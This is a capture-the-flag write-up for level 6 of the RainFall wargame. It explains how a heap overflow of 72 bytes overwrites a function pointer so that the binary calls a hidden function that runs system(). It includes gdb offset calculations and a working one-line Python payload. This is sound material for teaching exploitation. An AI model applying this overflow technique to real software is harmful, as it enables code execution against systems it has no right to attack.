# LEVEL06

## Analysis

```bash
   level6@RainFall:~$ ./level6 
   Segmentation fault (core dumped)
   level6@RainFall:~$ ./level6 salut
   Nope
```
Ok the function <n> makes a calls to <system@plt> so just like before we'll try to trigger that function. the normal flows call the function <m> through this pointer in main:
```
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
```

## Solution: Heap Overflow → Function Pointer Overwrite

First we need to calculate our offset. In our heap overflow we can find the offset by calculating the difference between the two mallocs (allocating space in the heap).

Using gdb there are different ways to find the offest:
First malloc:
```
   (gdb) info registers eax
   eax            0x804a008        134520840
```
Second malloc:
```
   (gdb) info registers eax
   eax            0x804a050        134520912
   (gdb) p 0x804a050 - 0x804a008
   $1 = 72
```
Or if we feed our program of 100 A's for instance:
```
   (gdb) x/s 0x804a050
   0x804a050:       'A' <repeats 28 times>
   (gdb) x/s 0x804a008
   0x804a008:       'A' <repeats 100 times>
```
100 - 28 = 72 which confirms our previous result.

We have the address of function <n> (08048454) so we just need to test our script now:
```bash
   level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
Here we basically overflow the first malloc, placing the <n> address in the heap through the second malloc. Then the pointer to heap called <n> instead of <m>.

